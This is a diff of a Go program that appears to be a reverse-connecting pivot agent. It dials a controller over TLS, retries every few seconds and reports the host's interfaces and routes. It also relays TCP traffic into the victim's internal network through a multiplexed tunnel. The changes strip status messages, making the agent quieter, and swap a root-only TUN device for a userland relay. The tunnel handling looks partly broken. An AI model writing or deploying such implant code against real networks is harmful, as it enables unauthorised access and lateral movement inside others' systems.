@@ -1,4 +1,4 @@
-ackage main
+package main
 
 import (
         "bufio"
@@ -6,32 +6,13 @@ import (
         "flag"
         "fmt"
         "io"
-        "log"
         "net"
         "os"
-        "os/exec"
         "strings"
         "time"
 
         "github.com/hashicorp/yamux"
-        "github.com/songgao/water"
 )
-
-func setupTun(ipAddr string) *water.Interface {
-        c := water.Config{
-                DeviceType: water.TUN,
-        }
-
-        ifce, err := water.New(c)
-        if err != nil {
-                log.Fatalf("[-] Erro ao criar tun: %v", err)
-        }
-
-        exec.Command("ip", "addr", "add", ipAddr, "dev", ifce.Name()).Run()
-        exec.Command("ip", "link", "set", "dev", ifce.Name(), "up").Run()
-
-        return ifce
-}
 
 func fnGetIfconfig() string {
         interfaces, err := net.Interfaces()
@@ -88,6 +69,69 @@ func fnGetRoutes() string {
         return strings.Join(routes, ",")
 }
 
+func handleUserlandTunnel(tunStream net.Conn) {
+        defer tunStream.Close()
+        lenBuf := make([]byte, 2)
+
+        for {
+                _, err := io.ReadFull(tunStream, lenBuf)
+                if err != nil {
+                        break
+                }
+                pktLen := int(lenBuf[0])<<8 | int(lenBuf[1])
+                if pktLen <= 0 || pktLen > 2000 {
+                        break
+                }
+                pktBuf := make([]byte, pktLen)
+                _, err = io.ReadFull(tunStream, pktBuf)
+                if err != nil {
+                        break
+                }
+
+                if len(pktBuf) < 20 {
+                        continue
+                }
+                ipVerHLen := pktBuf[0]
+                version := ipVerHLen >> 4
+                if version != 4 {
+                        continue
+                }
+                ihl := int(ipVerHLen&0x0f) * 4
+                if len(pktBuf) < ihl+4 {
+                        continue
+                }
+
+                proto := pktBuf[9]
+                
+                if proto != 6 { 
+                        continue
+                }
+
+                destIP := net.IPv4(pktBuf[16], pktBuf[17], pktBuf[18], pktBuf[19])
+                tcpHeaderOffset := ihl
+                if len(pktBuf) < tcpHeaderOffset+4 {
+                        continue
+                }
+                destPort := uint16(pktBuf[tcpHeaderOffset+2])<<8 | uint16(pktBuf[tcpHeaderOffset+3])
+
+                targetAddr := fmt.Sprintf("%s:%d", destIP.String(), destPort)
+
+                go func(target string, initialPkt []byte) {
+                        targetConn, err := net.Dial("tcp", target)
+                        if err != nil {
+                                return
+                        }
+                        defer targetConn.Close()
+
+
+                        go func() {
+                                io.Copy(targetConn, tunStream)
+                        }()
+                        io.Copy(tunStream, targetConn)
+                }(targetAddr, pktBuf)
+        }
+}
+
 func main() {
         connectTarget := flag.String("connect", "127.0.0.1:8080", "Endereço do controlador para se conectar (IP:Porta)")
         flag.Parse()
@@ -97,14 +141,11 @@ func main() {
         }
 
         for {
-                fmt.Printf("[*] Tentando conectar ao controlador em %s...\n", *connectTarget)
                 conn, err := tls.Dial("tcp", *connectTarget, tlsConfig)
                 if err != nil {
                         time.Sleep(5 * time.Second)
                         continue
                 }
-
-                fmt.Println("[+] Conectado ao controlador! Iniciando sessão...")
 
                 session, err := yamux.Client(conn, nil)
                 if err != nil {
@@ -141,6 +182,8 @@ func main() {
                                 } else if cmd == "autoroute" {
                                         routes := fnGetRoutes()
                                         ctrlStream.Write([]byte(routes))
+                                } else if cmd == "ping" {
+                                        continue
                                 }
                         }
                 }()
@@ -151,49 +194,11 @@ func main() {
                                 break
                         }
 
-                        fmt.Println("[+] Túnel L3 iniciado pelo controlador na sessão!")
-                        ifce := setupTun("10.10.10.2/24")
-
-                        go func() {
-                                buf := make([]byte, 2048)
-                                for {
-                                        n, err := ifce.Read(buf)
-                                        if err != nil {
-                                                break
-                                        }
-                                        if n > 0 {
-                                                pktLen := n
-                                                lenBuf := []byte{byte(pktLen >> 8), byte(pktLen & 0xff)}
-                                                tunStream.Write(lenBuf)
-                                                tunStream.Write(buf[:pktLen])
-                                        }
-                                }
-                        }()
-
-                        lenBuf := make([]byte, 2)
-                        for {
-                                _, err := io.ReadFull(tunStream, lenBuf)
-                                if err != nil {
-                                        break
-                                }
-                                pktLen := int(lenBuf[0])<<8 | int(lenBuf[1])
-                                if pktLen <= 0 || pktLen > 2000 {
-                                        break
-                                }
-                                pktBuf := make([]byte, pktLen)
-                                _, err = io.ReadFull(tunStream, pktBuf)
-                                if err != nil {
-                                        break
-                                }
-                                ifce.Write(pktBuf)
-                        }
-                        ifce.Close()
-                        fmt.Println("[-] Túnel L3 encerrado.")
+                        go handleUserlandTunnel(tunStream)
                 }
 
                 session.Close()
                 conn.Close()
-                fmt.Println("[-] Conexão com o controlador perdida. Tentando reconectar em breve...")
                 time.Sleep(5 * time.Second)
         }
 }
